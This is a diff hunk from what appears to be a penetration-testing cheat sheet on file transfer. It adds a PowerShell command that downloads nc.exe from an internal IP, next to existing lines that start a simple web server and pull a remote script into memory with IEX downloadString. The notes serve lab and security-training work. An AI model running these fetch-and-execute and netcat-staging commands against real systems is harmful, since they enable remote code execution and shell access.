@@ -33,6 +33,8 @@ python -m SimpleHTTPServer 80
 ```shell
 powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
 
+powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.51/nc.exe', 'nc.exe')" 
+
 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"
 
 powershell full path:
